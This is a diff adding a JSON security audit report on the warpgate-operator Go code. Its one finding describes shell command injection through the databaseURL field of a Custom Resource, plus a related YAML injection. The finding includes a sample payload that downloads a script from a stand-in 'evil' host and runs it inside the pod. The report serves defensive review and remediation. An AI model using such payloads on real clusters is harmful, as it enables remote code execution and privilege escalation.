@@ -1,0 +1,32 @@
+{
+  "summary": "Reviewed the warpgate-operator Go sources under internal/ (warpgate API client and all controllers), cmd/main.go, and the api/v1alpha1 types/webhooks, focusing on the trust boundary between attacker-influenceable Custom Resource fields and the Secrets, shell commands, YAML config, and outbound HTTP the operator generates. The dominant risk is that the WarpgateInstance.spec.databaseURL field is interpolated, unsanitized, into a shell script that the operator runs as an init container, giving anyone able to create/update a WarpgateInstance arbitrary command execution in the workload pod. The same field is also interpolated unescaped into the generated warpgate.yaml. Credential handling, ticket/secret lifecycle, and the metrics/webhook server setup otherwise follow standard kubebuilder patterns. Coverage was limited to reading the source (no build/run); RBAC manifests under config/ were not audited in depth.",
+  "coverage": [
+    "internal/warpgate/client.go",
+    "internal/warpgate/credentials.go",
+    "internal/warpgate/target.go",
+    "internal/warpgate/user.go",
+    "internal/warpgate/ssh_keys.go",
+    "internal/controller/helpers.go",
+    "internal/controller/warpgateinstance_controller.go",
+    "internal/controller/warpgatepasswordcredential_controller.go",
+    "internal/controller/warpgateticket_controller.go",
+    "internal/controller/httproute_watcher_controller.go",
+    "api/v1alpha1/warpgateinstance_webhook.go",
+    "cmd/main.go"
+  ],
+  "findings": [
+    {
+      "title": "Shell command injection via WarpgateInstance.spec.databaseURL in generated init-container script",
+      "category": "security",
+      "cwe": "CWE-78",
+      "severity": "high",
+      "confidence": "high",
+      "file": "internal/controller/warpgateinstance_controller.go",
+      "line_start": 556,
+      "line_end": 558,
+      "description": "The WarpgateInstance reconciler builds an init-container setup script by string-concatenation and then runs it via `Command: []string{\"/bin/sh\", \"-c\", initScript}` (line 776). The user-controlled field `inst.Spec.DatabaseURL` is interpolated directly inside a double-quoted shell word: `setupCmd += fmt.Sprintf(\" --database-url \\\"%s\\\"\", inst.Spec.DatabaseURL)`. Inside double quotes the shell still expands `$(...)`/backticks, and a literal `\"` breaks out of the quoting, so a databaseURL such as `x\"; wget http://evil/x -O /tmp/x; sh /tmp/x; :\"` or `$(malicious)` executes arbitrary commands in the Warpgate pod. The validating webhook (api/v1alpha1/warpgateinstance_webhook.go:256-258) only emits an advisory warning for databaseURL and performs no sanitization, so the value reaches the sink unchanged. Any principal with RBAC to create/update WarpgateInstance CRs \u2014 which need not include the ability to create arbitrary Pods/Deployments directly \u2014 gains code execution in the deployed workload, a privilege escalation / tenant-isolation break in multi-tenant clusters. The same unsanitized field is additionally injected, unescaped, into the generated warpgate.yaml at internal/controller/warpgateinstance_controller.go:344-345 (`fmt.Fprintf(&b, \"database_url: \\\"%s\\\"\\n\", inst.Spec.DatabaseURL)`), enabling YAML/config injection (CWE-91) via an embedded quote or newline; both sinks share the same root cause.",
+      "evidence": "line 557: setupCmd += fmt.Sprintf(` --database-url \"%s\"`, inst.Spec.DatabaseURL)\nline 570: fmt.Sprintf(\"  %s\", setupCmd)  // appended into scriptParts\nline 611: initScript := strings.Join(scriptParts, \"\\n\")\nline 776: Command: []string{\"/bin/sh\", \"-c\", initScript}\nSource: WarpgateInstance.spec.databaseURL (webhook only warns, never validates: warpgateinstance_webhook.go:256-258).\nSecondary sink: warpgateinstance_controller.go:345 writes the same value unescaped into database_url in warpgate.yaml.",
+      "recommendation": "Do not interpolate untrusted values into a shell string. Pass databaseURL to the setup command via an environment variable sourced safely (as is already done for ADMIN_PASSWORD) and reference it quoted (`--database-url \"$DATABASE_URL\"`), or invoke the binary with an explicit argv rather than `sh -c`. Additionally, strictly validate databaseURL in the webhook against an allowed URL scheme/format (reject quotes, backticks, `$`, newlines, and shell metacharacters), and YAML-encode the value (e.g. marshal via a YAML library) before writing warpgate.yaml at line 345."
+    }
+  ]
+}
